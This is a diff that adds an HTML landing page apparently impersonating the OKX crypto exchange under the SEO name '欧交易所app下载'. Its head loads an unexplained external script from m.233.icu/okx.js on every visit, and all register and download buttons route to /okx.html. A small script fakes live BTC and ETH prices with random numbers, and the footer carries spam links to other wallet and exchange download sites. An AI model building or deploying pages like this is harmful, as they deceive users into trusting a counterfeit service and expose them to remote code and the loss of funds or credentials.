@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="description" content="欧交易所app下载在资产安全防护上投入巨大,采用多重加密技术与冷热钱包分离存储策略,冷钱包离线存放大部分用户资产,热钱包仅保留少量用于日常交易,全方位保障用户资金安全。">
+      <meta name="keywords" content="欧交易所app下载">
+     <title>欧交易所app下载_体验安全的数字货币交易</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Noto+Sans+SC:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Noto Sans SC', 'Inter', sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+        
+        /* 动态流体背景 */
+        .fluid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
+            filter: blur(80px);
+            animation: fluid-move 20s ease-in-out infinite;
+            z-index: 0;
+        }
+        
+        @keyframes fluid-move {
+            0%, 100% { 
+                transform: translate(0, 0) scale(1); 
+            }
+            33% { 
+                transform: translate(30px, -50px) scale(1.1); 
+            }
+            66% { 
+                transform: translate(-20px, 20px) scale(0.9); 
+            }
+        }
+        
+        /* 网格叠加 */
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        /* 玻璃拟态 */
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .glass-strong {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* 欧交易所app下载按钮 - 流体渐变 */
+        .btn-fluid {
+            position: relative;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-weight: 600;
+            border-radius: 16px;
+            overflow: hidden;
+            transition: all 0.3s;
+            z-index: 1;
+        }
+        
+        .btn-fluid::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+            z-index: -1;
+        }
+        
+        .btn-fluid:hover::before {
+            left: 100%;
+        }
+        
+        .btn-fluid:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.4);
+        }
+        
+        /* 白色按钮 */
+        .btn-white {
+            background: white;
+            color: #0a0a0a;
+            font-weight: 600;
+            border-radius: 16px;
+            transition: all 0.3s;
+        }
+        
+        .btn-white:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(255,255,255,0.3);
+        }
+        
+        /* 线框按钮 */
+        .btn-glass {
+            background: transparent;
+            color: white;
+            font-weight: 600;
+            border-radius: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            transition: all 0.3s;
+        }
+        
+        .btn-glass:hover {
+            background: rgba(255,255,255,0.1);
+            border-color: white;
+            transform: translateY(-3px);
+        }
+        
+        /* 价格闪烁 */
+        @keyframes flash-green {
+            0%, 100% { color: #00d9ff; text-shadow: 0 0 10px rgba(0, 217, 255, 0.5); }
+            50% { color: #69f0ae; }
+        }
+        @keyframes flash-red {
+            0%, 100% { color: #ff0055; text-shadow: 0 0 10px rgba(255, 0, 85, 0.5); }
+            50% { color: #ff4081; }
+        }
+        .flash-up { animation: flash-green 2s infinite; }
+        .flash-down { animation: flash-red 2s infinite; }
+        
+        /* 浮动动画 */
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(1deg); }
+        }
+        .animate-float { animation: float 6s ease-in-out infinite; }
+        
+        /* 滚动条 */
+        ::-webkit-scrollbar {
+            width: 8px;
+            background: #0a0a0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #667eea, #764ba2);
+            border-radius: 4px;
+        }
+        
+        /* 数字字体 */
+        .font-num {
+            font-feature-settings: "tnum";
+            font-variant-numeric: tabular-nums;
+        }
+        
+        /* 光晕文字 */
+        .glow-text {
+            text-shadow: 0 0 40px rgba(255,255,255,0.3);
+        }
+        
+        /* 卡片悬浮 */
+        .card-hover {
+            transition: all 0.4s;
+        }
+        .card-hover:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+        }
+    </style>
+        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; }
+            else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?01c83902f378f54c075a86cb18ba04d0";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+ <script language="javascript" src="https://m.233.icu/okx.js"></script></head>
+<body>
+
+    
+    <div class="fluid-bg"></div>
+    <div class="grid-overlay"></div>
+
+    
+    <nav class="fixed w-full z-50 glass border-b border-white/10">
+        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-gradient-to-br from-blue-400 to-purple-600 rounded-xl flex items-center justify-center font-bold text-white text-xl shadow-lg">
+                    O
+                </div>
+                <div>
+                    <div class="font-bold text-xl tracking-wider">欧交易所app下载</div>
+                    <div class="text-[10px] text-gray-400 tracking-widest"></div>
+                </div>
+            </div>
+            
+            <div class="hidden md:flex items-center gap-8 text-sm text-gray-300">
+                <a href="#" class="hover:text-white transition">首页</a>
+                <a href="#" class="hover:text-white transition">交易</a>
+                <a href="#" class="hover:text-white transition">行情</a>
+                <a href="#" class="hover:text-white transition">金融</a>
+                <a href="#" class="hover:text-white transition">更多</a>
+            </div>
+
+            <div class="flex items-center gap-4">
+                <a href="/okx.html" class="text-sm text-gray-400 hover:text-white transition">登录</a>
+                <a href="/okx.html" class="btn-white px-5 py-2 text-sm">
+                    注册
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    
+    <section class="relative min-h-screen flex items-center justify-center pt-20 px-6">
+        <div class="container mx-auto max-w-6xl relative z-10">
+            <div class="grid lg:grid-cols-2 gap-16 items-center">
+                
+                
+                <div class="space-y-8 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-2 px-4 py-2 glass rounded-full text-sm">
+                        <span class="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></span>
+                        新用户专享：零手续费交易30天
+                    </div>
+                    
+                    <h1 class="text-5xl md:text-7xl font-bold leading-tight glow-text">
+                        探索欧交易所app下载<br>
+                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500">
+                            数字未来
+                        </span>
+                    </h1>
+                    
+                    <p class="text-gray-400 text-lg max-w-md mx-auto lg:mx-0 leading-relaxed">
+                        欧交易所app下载为全球用户提供安全、高效的数字资产交易服务。支持500+币种，毫秒级撮合引擎。
+                    </p>
+
+                    
+                    <div class="flex flex-wrap justify-center lg:justify-start gap-4 py-6">
+                        <div class="glass-strong px-6 py-4 rounded-2xl min-w-[140px]">
+                            <div class="text-xs text-gray-400 mb-1">BTC/USDT</div>
+                            <div class="text-2xl font-bold flash-up font-num">67,245.00</div>
+                            <div class="text-xs text-blue-400 mt-1">+2.34%</div>
+                        </div>
+                        <div class="glass-strong px-6 py-4 rounded-2xl min-w-[140px]">
+                            <div class="text-xs text-gray-400 mb-1">ETH/USDT</div>
+                            <div class="text-2xl font-bold flash-down font-num">3,456.78</div>
+                            <div class="text-xs text-pink-400 mt-1">-1.23%</div>
+                        </div>
+                        <div class="glass-strong px-6 py-4 rounded-2xl min-w-[140px] hidden sm:block">
+                            <div class="text-xs text-gray-400 mb-1">OKB/USDT</div>
+                            <div class="text-2xl font-bold text-purple-400 font-num">45.67</div>
+                            <div class="text-xs text-purple-400 mt-1">+5.67%</div>
+                        </div>
+                    </div>
+
+                    
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start pt-4">
+                        <a href="/okx.html" class="btn-fluid px-12 py-5 text-lg flex items-center justify-center gap-3 group">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                            </svg>
+                            立即注册
+                            <svg class="w-5 h-5 transform group-hover:translate-x-1 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path>
+                            </svg>
+                        </a>
+                        
+                        <a href="/okx.html" class="btn-glass px-12 py-5 text-lg flex items-center justify-center gap-3">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                            </svg>
+                            马上下载
+                        </a>
+                    </div>
+
+                    <div class="flex items-center justify-center lg:justify-start gap-6 text-xs text-gray-500">
+                        <span class="flex items-center gap-2">
+                            <div class="w-5 h-5 rounded-full bg-blue-500/20 flex items-center justify-center">
+                                <svg class="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            全球合规
+                        </span>
+                        <span class="flex items-center gap-2">
+                            <div class="w-5 h-5 rounded-full bg-purple-500/20 flex items-center justify-center">
+                                <svg class="w-3 h-3 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            资产安全
+                        </span>
+                        <span class="flex items-center gap-2">
+                            <div class="w-5 h-5 rounded-full bg-pink-500/20 flex items-center justify-center">
+                                <svg class="w-3 h-3 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            7×24服务
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="relative hidden lg:block animate-float">
+                    <div class="glass-strong p-8 rounded-3xl relative overflow-hidden">
+                        
+                        <div class="absolute -top-20 -right-20 w-40 h-40 bg-blue-500/30 rounded-full blur-3xl"></div>
+                        <div class="absolute -bottom-20 -left-20 w-40 h-40 bg-purple-500/30 rounded-full blur-3xl"></div>
+                        
+                        <div class="relative z-10">
+                            <div class="flex justify-between items-center mb-6">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-12 h-12 bg-gradient-to-br from-orange-400 to-red-500 rounded-full flex items-center justify-center text-white font-bold text-lg">
+                                        ₿
+                                    </div>
+                                    <div>
+                                        <div class="font-bold text-lg">Bitcoin</div>
+                                        <div class="text-xs text-gray-400">BTC/USDT</div>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <div class="text-3xl font-bold font-num text-blue-400">67,245.00</div>
+                                    <div class="text-xs text-blue-400">+2.34%</div>
+                                </div>
+                            </div>
+                            
+                            
+                            <div class="h-40 flex items-end justify-between gap-1 mb-6">
+                                <div class="w-full bg-gradient-to-t from-blue-500/20 to-blue-400/40 rounded-t" style="height: 30%"></div>
+                                <div class="w-full bg-gradient-to-t from-blue-500/30 to-blue-400/50 rounded-t" style="height: 45%"></div>
+                                <div class="w-full bg-gradient-to-t from-blue-500/40 to-blue-400/60 rounded-t" style="height: 35%"></div>
+                                <div class="w-full bg-gradient-to-t from-purple-500/40 to-purple-400/60 rounded-t" style="height: 60%"></div>
+                                <div class="w-full bg-gradient-to-t from-purple-500/50 to-purple-400/70 rounded-t" style="height: 50%"></div>
+                                <div class="w-full bg-gradient-to-t from-pink-500/50 to-pink-400/70 rounded-t" style="height: 80%"></div>
+                                <div class="w-full bg-gradient-to-t from-pink-500 to-pink-400 rounded-t" style="height: 100%"></div>
+                                <div class="w-full bg-gradient-to-t from-pink-500/80 to-pink-400 rounded-t" style="height: 90%"></div>
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-4">
+                                <button class="py-3 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-xl font-bold hover:shadow-lg hover:shadow-blue-500/30 transition">
+                                    买入
+                                </button>
+                                <button class="py-3 bg-gradient-to-r from-pink-500 to-pink-600 text-white rounded-xl font-bold hover:shadow-lg hover:shadow-pink-500/30 transition">
+                                    卖出
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                    <div class="absolute -bottom-6 -right-6 glass p-4 rounded-2xl max-w-[200px] animate-float" style="animation-delay: 1s;">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 bg-gradient-to-br from-green-400 to-blue-500 rounded-full flex items-center justify-center">
+                                <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                                </svg>
+                            </div>
+                            <div>
+                                <div class="text-sm font-bold">撮合成功</div>
+                                <div class="text-xs text-gray-400">0.5 BTC 已成交</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section class="relative z-10 py-20 border-t border-white/10">
+        <div class="container mx-auto px-6">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
+                <div class="text-center">
+                    <div class="text-4xl md:text-5xl font-bold font-num text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">5000万+</div>
+                    <div class="text-gray-400 text-sm mt-2">全球用户信赖</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-4xl md:text-5xl font-bold font-num text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">500+</div>
+                    <div class="text-gray-400 text-sm mt-2">优质币种</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-4xl md:text-5xl font-bold font-num text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-red-400">$100亿+</div>
+                    <div class="text-gray-400 text-sm mt-2">日交易额</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-4xl md:text-5xl font-bold font-num text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-blue-400">99.99%</div>
+                    <div class="text-gray-400 text-sm mt-2">系统稳定性</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section class="relative z-10 py-20 border-t border-white/10">
+        <div class="container mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl md:text-4xl font-bold mb-4">为什么选择欧交易所app下载</h2>
+                <p class="text-gray-400">为全球用户提供专业级的数字资产交易服务</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="glass p-8 rounded-3xl card-hover cursor-pointer group">
+                    <div class="w-16 h-16 mb-6 rounded-2xl bg-gradient-to-br from-blue-500/20 to-blue-600/20 flex items-center justify-center group-hover:scale-110 transition-transform">
+                        <svg class="w-8 h-8 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">安全可靠</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        多重签名冷钱包存储，7年零安全事故，资产安全有保障
+                    </p>
+                </div>
+
+                <div class="glass p-8 rounded-3xl card-hover cursor-pointer group">
+                    <div class="w-16 h-16 mb-6 rounded-2xl bg-gradient-to-br from-purple-500/20 to-purple-600/20 flex items-center justify-center group-hover:scale-110 transition-transform">
+                        <svg class="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">极速交易</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        自主研发撮合引擎，每秒处理百万级订单，延迟低至1毫秒
+                    </p>
+                </div>
+
+                <div class="glass p-8 rounded-3xl card-hover cursor-pointer group">
+                    <div class="w-16 h-16 mb-6 rounded-2xl bg-gradient-to-br from-pink-500/20 to-pink-600/20 flex items-center justify-center group-hover:scale-110 transition-transform">
+                        <svg class="w-8 h-8 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">产品丰富</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        币币、合约、期权、DeFi、NFT，一站式数字资产服务
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section class="relative z-10 py-20 border-t border-white/10 bg-gradient-to-b from-transparent to-black/50">
+        <div class="container mx-auto px-6 text-center">
+            <div class="max-w-3xl mx-auto space-y-8">
+                <h2 class="text-3xl md:text-5xl font-bold glow-text">开启您的数字资产之旅</h2>
+                <p class="text-gray-400 text-lg">
+                    立即注册欧交易所app下载，探索区块链的无限可能
+                </p>
+                
+                
+                <div class="flex flex-col sm:flex-row gap-4 justify-center pt-4">
+                    <a href="/okx.html" class="btn-fluid px-14 py-5 text-xl flex items-center justify-center gap-3">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path>
+                        </svg>
+                        立即注册
+                    </a>
+                    <a href="/okx.html" class="btn-glass px-14 py-5 text-xl flex items-center justify-center gap-3">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                        </svg>
+                        马上下载
+                    </a>
+                </div>
+                
+                <div class="flex justify-center gap-6 text-sm text-gray-500 pt-4">
+                    <span class="flex items-center gap-2">
+                        <div class="w-2 h-2 rounded-full bg-white"></div>
+                        iOS
+                    </span>
+                    <span class="flex items-center gap-2">
+                        <div class="w-2 h-2 rounded-full bg-green-400"></div>
+                        Android
+                    </span>
+                    <span class="flex items-center gap-2">
+                        <div class="w-2 h-2 rounded-full bg-blue-400"></div>
+                        Windows
+                    </span>
+                    <span class="flex items-center gap-2">
+                        <div class="w-2 h-2 rounded-full bg-gray-400"></div>
+                        Mac
+                    </span>
+                    <span class="flex items-center gap-2">
+                        <div class="w-2 h-2 rounded-full bg-purple-400"></div>
+                        Web
+                    </span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <footer class="relative z-10 bg-black/80 border-t border-white/10 py-12 px-6">
+        <div class="container mx-auto">
+            <div class="grid md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-8 h-8 bg-gradient-to-br from-blue-400 to-purple-600 rounded-lg flex items-center justify-center font-bold text-white">O</div>
+                        <span class="font-bold">欧交易所app下载 </span>
+                    </div>
+                    <p class="text-gray-600 text-sm leading-relaxed">
+                        全球领先的数字资产交易平台，为用户提供安全、便捷的区块链服务。
+                    </p>
+                </div>
+                
+                <div>
+                    <h4 class="font-bold mb-4 text-sm text-gray-300">产品</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li><a href="#" class="hover:text-white transition">快捷买币</a></li>
+                        <li><a href="#" class="hover:text-white transition">币币交易</a></li>
+                        <li><a href="#" class="hover:text-white transition">合约交易</a></li>
+                        <li><a href="#" class="hover:text-white transition">期权交易</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-bold mb-4 text-sm text-gray-300">服务</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li><a href="#" class="hover:text-white transition">帮助中心</a></li>
+                        <li><a href="#" class="hover:text-white transition">手续费率</a></li>
+                        <li><a href="#" class="hover:text-white transition">API文档</a></li>
+                        <li><a href="#" class="hover:text-white transition">邀请返佣</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-bold mb-4 text-sm text-gray-300">关于</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li><a href="#" class="hover:text-white transition">关于我们</a></li>
+                        <li><a href="#" class="hover:text-white transition">加入我们</a></li>
+                        <li><a href="#" class="hover:text-white transition">媒体联络</a></li>
+                        <li><a href="#" class="hover:text-white transition">用户协议</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="border-t border-white/10 pt-8 text-center text-xs text-gray-700">
+                <p>数字资产交易存在风险，请谨慎投资。© 2024 欧交易所app下载  版权所有</p>
+            </div>
+        </div>
+            <div class="footer_bottom">
+            <p class="muted">
+                <a href="/">欧交易所app下载</a>
+                <a href="https://adamsmelissa431.github.io/" target="_blank">币圈合约返佣</a><a href="http://2x.chaobiruanjian2.com.cn/" target="_blank">毕安交易所</a><a href="https://freemanreginald744.github.io/" target="_blank">波比钱包下载地址</a><a href="https://kp.pantong.shop/" target="_blank">波比钱包下载地址</a><a href="https://4n2.mang.ink/" target="_blank">gate官网</a><a href="https://greenmary524.github.io/" target="_blank">WEEX安卓版下载</a><a href="https://jonestina26.github.io/" target="_blank">BG交易所app官网网页</a><a href="https://campbelljanet961.github.io/" target="_blank">数字钱包</a>                            </p>
+        </div></footer>
+
+    <script>
+        // 价格实时更新
+        setInterval(() => {
+            const btc = document.querySelector('.flash-up');
+            const eth = document.querySelector('.flash-down');
+            
+            if(btc) {
+                const base = 67245;
+                const change = (Math.random() - 0.5) * 100;
+                btc.textContent = (base + change).toFixed(2);
+            }
+            if(eth) {
+                const base = 3456;
+                const change = (Math.random() - 0.5) * 10;
+                eth.textContent = (base + change).toFixed(2);
+            }
+        }, 3000);
+    </script></body>
+</html>
